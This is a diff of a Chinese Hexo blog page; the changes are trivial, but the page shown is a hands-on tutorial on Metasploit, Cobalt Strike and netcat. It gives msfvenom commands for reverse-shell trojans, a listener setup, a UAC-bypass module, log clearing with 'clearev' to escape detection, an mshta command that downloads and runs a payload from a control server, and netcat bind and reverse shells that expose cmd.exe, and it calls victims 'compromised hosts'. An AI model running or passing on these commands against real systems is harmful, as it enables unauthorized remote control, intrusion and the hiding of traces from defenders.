@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Ex1t" type="application/atom+xml">
 </head>
@@ -435,6 +435,7 @@
 <pre class="line-numbers language-none"><code class="language-none">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \
   chmod 755 msfinstall &amp;&amp; \
   ./msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>可能有些久</p>
 <h3 id="1-3-使用说明"><a href="#1-3-使用说明" class="headerlink" title="1.3 使用说明"></a>1.3 使用说明</h3><pre class="line-numbers language-none"><code class="language-none">进入框架：msfconsole
 使用search命令查找相关漏洞： search  ms17-010
@@ -446,6 +447,7 @@
           set port   8888
 攻击：exploit或run
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>漏洞利用exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。<br>Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意代码</p>
 <h3 id="1-4-木马生成"><a href="#1-4-木马生成" class="headerlink" title="1.4  木马生成"></a>1.4  木马生成</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows
  msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口 <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip  -f -o shell.exe
@@ -469,8 +471,10 @@ Perl
 msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f raw <span class="token operator">&gt;</span> shell.pl
 python
 msfvenom -p python/meterpreter/reverser_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>控制机ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>控制机端口-f   raw <span class="token operator">&gt;</span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="1-5-实战"><a href="#1-5-实战" class="headerlink" title="1.5  实战"></a>1.5  实战</h3><p>生成恶意exe木马，在测试机上运行，在服务器进行反向连接</p>
 <pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.10.27  -f -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>原理是让测试机运行木马后 连接 控制机ip：端口</p>
 <p>进入msf控制台，完成以下配置</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler  <span class="token comment">#使用exploit/multi/handler监听从肉鸡发来的数据</span>
@@ -478,6 +482,7 @@ msf exploit<span class="token punctuation">(</span>handler<span class="token pun
 msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.10.27  <span class="token comment">#我们的主机ip</span>
 msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">8888</span>            <span class="token comment">#我们的主机端口</span>
 msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>然后在测试机上运行木马</p>
 <p><img src="http://img.ex1t.xyz/20201230174312.png"></p>
 <p>连接成功</p>
@@ -512,11 +517,14 @@ use exploit/windows/local/bypassuac_eventvwr命令进入该模块
 设置session为你要使用的session
 
 clearev 清除日志跑路<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="2、CobaltStrike"><a href="#2、CobaltStrike" class="headerlink" title="2、CobaltStrike"></a>2、CobaltStrike</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1  简介"></a>2.1  简介</h3><p>是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p>
 <h3 id="2-2-下载安装"><a href="#2-2-下载安装" class="headerlink" title="2.2  下载安装"></a>2.2  下载安装</h3><pre class="line-numbers language-none"><code class="language-none">链接：https://pan.baidu.com/s/1ASUKsjtEr6roVdMVMmhUsg 
 提取码：8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>首先部署在linux服务器，默认使用的是50050端口,用户名是neo</p>
 <pre class="line-numbers language-none"><code class="language-none">nohup ./teamserver 服务器ip 登陆密码 &gt;/dev/null 2&gt;&amp;1 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>nobup是后台运行</p>
 <p>然后客户端连接，windows运行start.bat</p>
 <p><img src="http://img.ex1t.xyz/20201230174110.png"></p>
@@ -537,12 +545,14 @@ clearev 清除日志跑路<span aria-hidden="true" class="line-numbers-rows"><sp
 <p>会生成一个下载链接</p>
 <p>测试机执行</p>
 <pre class="line-numbers language-none"><code class="language-none">mshta http://ip:80/download/file1.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>或下载运行</p>
 <p>已连接机器图，然后右击进行各类操作</p>
 <p><img src="http://img.ex1t.xyz/20201230174209.png"></p>
 <p>剩下的还是自己摸索这玩吧</p>
 <h2 id="接下来说一下MSF和CS联动"><a href="#接下来说一下MSF和CS联动" class="headerlink" title="接下来说一下MSF和CS联动"></a>接下来说一下MSF和CS联动</h2><h3 id="1-1-MSF转移到CS"><a href="#1-1-MSF转移到CS" class="headerlink" title="1.1  MSF转移到CS"></a>1.1  MSF转移到CS</h3><p>简单方法进入cmd运行下</p>
 <pre class="line-numbers language-none"><code class="language-none">mshta http://ip:80/download/file1.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <pre class="line-numbers language-none"><code class="language-none">复杂一点的
 use exploit/windows/local/payload_inject（选用exploit）
 set payload windows/x64/meterpreter/reverse_http（选用的payload一定要跟cs下监听的payload方式一样）
@@ -552,6 +562,7 @@ set LPORT 端口（端口为cs对应的接受反弹shell的端口）
 set pid 进程号（设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限）
 set session 1（设置需要派送的meterpreter）
 exploit（开始执行）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="1-2-CS转移到MSF"><a href="#1-2-CS转移到MSF" class="headerlink" title="1.2  CS转移到MSF"></a>1.2  CS转移到MSF</h3><p>msf配置</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler 
 
@@ -562,6 +573,7 @@ exploit（开始执行）<span aria-hidden="true" class="line-numbers-rows"><spa
 <span class="token builtin class-name">set</span> lport 接受的端口 
 
 exploit 执行 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>然后cs上，右击测试机-&gt;增加会话</p>
 <p>增加监听器，payload选择Foreign HTTP，然后配置</p>
 <p><img src="http://img.ex1t.xyz/20201230174221.png"></p>
@@ -578,18 +590,23 @@ exploit 执行 <span aria-hidden="true" class="line-numbers-rows"><span></span><
 -z :  不进行交互，直接显示结果 
 -u ：使用UDP协议传输 
 -w :  设置超时时间 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="1-4-功能实现"><a href="#1-4-功能实现" class="headerlink" title="1.4 功能实现"></a>1.4 功能实现</h3><h4 id="1-4-1-建立简单的聊天室"><a href="#1-4-1-建立简单的聊天室" class="headerlink" title="1.4.1  建立简单的聊天室"></a>1.4.1  建立简单的聊天室</h4><p>服务器端： nc   -lvp    8888     #监听8888端口   客户端： nc  -nv  ip  8888    #连接到服务器的8888端口 </p>
 <p>然后双发输入,对方都能看得到</p>
 <h4 id="1-4-2-传文件"><a href="#1-4-2-传文件" class="headerlink" title="1.4.2  传文件"></a>1.4.2  传文件</h4><pre class="line-numbers language-none"><code class="language-none">服务器端： nc  -lvp  8888 &lt; test.txt 客户端： nc -nv ip 8888 &gt; te<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>st.txt </p>
 <h4 id="1-4-3-正向连接"><a href="#1-4-3-正向连接" class="headerlink" title="1.4.3  正向连接"></a>1.4.3  正向连接</h4><p>肉鸡开放8888端口作为cmd执行 </p>
 <pre class="line-numbers language-none"><code class="language-none">nc -lvv -p 8888 -t -e cmd.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>我们的主机访问肉鸡的8888 </p>
 <pre class="line-numbers language-none"><code class="language-none">nc  -nvv  肉鸡ip  8888 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h4 id="1-4-4-反向连接"><a href="#1-4-4-反向连接" class="headerlink" title="1.4.4  反向连接"></a>1.4.4  反向连接</h4><p>我们的主机</p>
 <pre class="line-numbers language-none"><code class="language-none">nc  -lvp  8888 
 
 nc  -t -e cmd.exe  控制机ip 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p> 未完待续</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>   工具还有.了解大概功能和原理，以后需要的时候就能直接使用。等有空的时候再写一点。<br>   文章若存在问题，敬请指正。</p>
 <p>以上仅供学习交流，严禁用于违法途径（手动狗头）</p>
